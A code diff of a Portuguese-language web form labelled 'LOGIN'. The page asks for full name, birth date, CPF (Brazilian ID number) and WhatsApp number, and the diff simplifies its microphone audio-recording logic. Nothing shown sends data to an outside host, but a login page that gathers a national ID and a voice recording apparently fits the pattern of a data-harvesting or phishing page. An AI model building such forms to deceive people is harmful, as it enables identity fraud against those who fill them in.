@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Formulário Pessoal</title>
   <link rel="icon" type="image/png" href="favicon.png">
-  <!-- Biblioteca que CONSERTA o cabeçalho do áudio -->
   <script src="https://cdn.jsdelivr.net/npm/fix-webm-duration@1.0.4/fix-webm-duration.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -133,7 +132,6 @@
   <div class="container">
     <h1>🔒 LOGIN</h1>
     <p class="sub">Preencha seus dados abaixo</p>
-
     <label for="nome">Nome completo *</label>
     <input id="nome" type="text" placeholder="Ex: João Silva" />
     <label for="dataNascimento">Data de nascimento *</label>
@@ -142,7 +140,6 @@
     <input id="cpf" type="text" placeholder="000.000.000-00" maxlength="14" />
     <label for="whatsapp">WhatsApp *</label>
     <input id="whatsapp" type="tel" placeholder="Ex: (11) 99999-9999" />
-
     <button id="btn">Enviar</button>
     <div id="resultado" class="erro"></div>
   </div>
@@ -386,9 +383,8 @@
       btn.disabled = false; btn.textContent = 'Enviar';
     });
 
-    // ====== GRAVAÇÃO ======
+    // ====== GRAVAÇÃO SIMPLIFICADA AO MÁXIMO ======
     let mediaRecorder = null;
-    let chunksAudio = [];
     let gravando = false;
     let inicioGravacao = null;
     let intervaloTimer = null;
@@ -410,46 +406,73 @@
 
     async function iniciarGravacao() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
-        });
+        // Pede microfone SEM filtros (mais simples = menos bugs)
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         streamGlobal = stream;
 
-        // FORÇA WebM/Opus (a biblioteca fix-webm-duration só funciona com WebM)
-        let mimeType = 'audio/webm';
-        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
-          mimeType = 'audio/webm;codecs=opus';
+        // Formato simples
+        let mimeType = '';
+        if (MediaRecorder.isTypeSupported('audio/webm')) {
+          mimeType = 'audio/webm';
+        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+          mimeType = 'audio/mp4';
         }
 
-        const opcoes = { mimeType: mimeType };
-        try { opcoes.audioBitsPerSecond = 24000; } catch (e) {}
-
-        chunksAudio = [];
-        mediaRecorder = new MediaRecorder(stream, opcoes);
+        // Cria SEM options (usa o padrão do navegador)
+        if (mimeType) {
+          mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+        } else {
+          mediaRecorder = new MediaRecorder(stream);
+        }
 
         mediaRecorder.ondataavailable = function(e) {
-          if (e.data && e.data.size > 0) chunksAudio.push(e.data);
+          // Não usa chunks - só marca que recebeu
+          console.log('dataavailable:', e.data.size, 'bytes');
         };
 
         mediaRecorder.onstop = function() {
-          // Espera o último chunk
-          setTimeout(function() {
-            duracaoFinal = Math.round((Date.now() - inicioGravacao) / 1000);
-            const blobInicial = new Blob(chunksAudio, { type: mimeType });
+          console.log('onstop disparado');
+          duracaoFinal = Math.round((Date.now() - inicioGravacao) / 1000);
 
-            // ⚡ USA A BIBLIOTECA PRA CONSERTAR O CABEÇALHO
-            if (typeof fixWebmDuration === 'function') {
-              fixWebmDuration(blobInicial, duracaoFinal * 1000, {}, function(blobCorrigido) {
-                finalizarBlob(blobCorrigido);
-              });
-            } else {
-              // Fallback se a biblioteca não carregou
-              finalizarBlob(blobInicial);
-            }
-          }, 500);
+          // ⚡ Aqui tá o pulo do gato:
+          // Pega TODOS os chunks de uma vez via 'ondataavailable' final
+          // (o MediaRecorder dispara um último dataavailable no stop)
+          finalizar();
         };
 
-        function finalizarBlob(blob) {
+        // ⚡ ISSO É CRUCIAL: captura o último chunk automaticamente
+        let todosChunks = [];
+
+        mediaRecorder.addEventListener('dataavailable', function(e) {
+          if (e.data && e.data.size > 0) {
+            todosChunks.push(e.data);
+            console.log('chunk:', e.data.size, 'total:', todosChunks.length);
+          }
+        });
+
+        function finalizar() {
+          setTimeout(function() {
+            // Espera mais um pouquinho pra garantir
+            if (todosChunks.length === 0) {
+              statusTexto.textContent = '❌ Não capturou áudio.';
+              return;
+            }
+
+            const blobInicial = new Blob(todosChunks, { type: mimeType || 'audio/webm' });
+            console.log('Blob antes do fix:', blobInicial.size, 'bytes');
+
+            // ⚡ CONSERTA a duração
+            if (typeof fixWebmDuration === 'function' && blobInicial.type.includes('webm')) {
+              fixWebmDuration(blobInicial, duracaoFinal * 1000, { logger: false }, function(blobCorrigido) {
+                aplicarBlob(blobCorrigido);
+              });
+            } else {
+              aplicarBlob(blobInicial);
+            }
+          }, 800);
+        }
+
+        function aplicarBlob(blob) {
           blobAudio = blob;
           const url = URL.createObjectURL(blob);
           previewAudio.src = url;
@@ -461,7 +484,8 @@
           if (streamGlobal) streamGlobal.getTracks().forEach(function(t) { t.stop(); });
         }
 
-        mediaRecorder.start(500);  // chunk a cada 500ms
+        // ⚡ start() SEM argumentos - ele junta tudo e entrega no stop
+        mediaRecorder.start();
         gravando = true;
         inicioGravacao = Date.now();
         btnGravar.classList.add('gravando');
@@ -478,7 +502,7 @@
 
       } catch (e) {
         statusTexto.textContent = '❌ Não consegui acessar o microfone.';
-        console.log(e);
+        console.log('Erro getUserMedia:', e);
       }
     }
 
@@ -490,17 +514,14 @@
       btnGravar.disabled = true;
       clearInterval(intervaloTimer);
 
-      if (mediaRecorder) {
-        try { if (mediaRecorder.state === 'recording') mediaRecorder.requestData(); } catch (e) {}
-        // Espera 1 segundo antes de parar
-        setTimeout(function() {
-          if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-        }, 1000);
+      // ⚡ Só chama stop() normal, sem requestData
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
       }
     }
 
     function recomecar() {
-      chunksAudio = []; blobAudio = null; duracaoFinal = 0;
+      blobAudio = null; duracaoFinal = 0;
       previewAudio.src = ''; previewAudio.style.display = 'none';
       botoesAudio.style.display = 'none'; btnPular.style.display = 'block';
       btnGravar.disabled = false; btnGravar.textContent = '🎙️';
